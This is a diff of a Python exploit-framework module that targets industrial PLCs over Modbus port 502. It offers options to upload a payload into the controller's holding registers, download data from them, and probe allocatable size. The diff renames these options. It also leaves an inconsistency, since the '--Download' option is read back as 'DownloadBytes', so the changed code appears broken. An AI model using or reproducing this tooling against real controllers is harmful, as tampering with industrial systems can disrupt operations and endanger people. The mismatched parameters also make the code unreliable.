@@ -17,27 +17,26 @@ class MyScript(BaseExploit):
 
     register_options = [
         mkopt('--Function', metavar='<UploadFun/DownloadFun/SizeFun>', help='upload or download or size'),
-        mkopt('--upload', metavar='<payld.bin>', help='payload to upload to the PLC'),
-        mkopt('--download', metavar='<n bytes>', help='download <n> bytes from the PLC.'),
-        mkopt('--size', metavar='<n bytes>', help='check if the PLC can allocate <n> bytes in its holding registers'),
-        mkopt('--addr', metavar='<addr>', help='start address from which to upload/download data (0 if not set)', default=0),
+        mkopt('--Upload', metavar='<payld.bin>', help='payload to upload to the PLC'),
+        mkopt('--Download', metavar='<n bytes>', help='download <n> bytes from the PLC.'),
+        mkopt('--Size', metavar='<n bytes>', help='check if the PLC can allocate <n> bytes in its holding registers'),
+        mkopt('--StartAddr', metavar='<addr>', help='start address from which to upload/download data (0 if not set)', default=0),
         mkopt_rport(502),
     ]
 
     def exploit(self, *args, **kwargs):
         fname = self.getParam('Function')
         if fname == 'DownloadFun':
-            size = int(self.getParam('download'))
-            addr = int(self.getParam('addr'))
+            size = int(self.getParam('DownloadBytes'))
+            addr = int(self.getParam('StartAddr'))
             download_data(size, self.TargetIp, addr)
         elif fname == 'UploadFun':
-            upload = self.getParam('upload')
-            addr = int(self.getParam('addr'))
+            upload = self.getParam('Upload')
+            addr = int(self.getParam('StartAddr'))
             upload_payload(upload, self.TargetIp, addr)
         elif fname == 'SizeFun':
-            addr = int(self.getParam('addr'))
-            size = check_size(addr, self.TargetIp)
-            print size
+            num = int(self.getParam('Size'))
+            size = check_size(num, self.TargetIp)
         else:
             raise
 
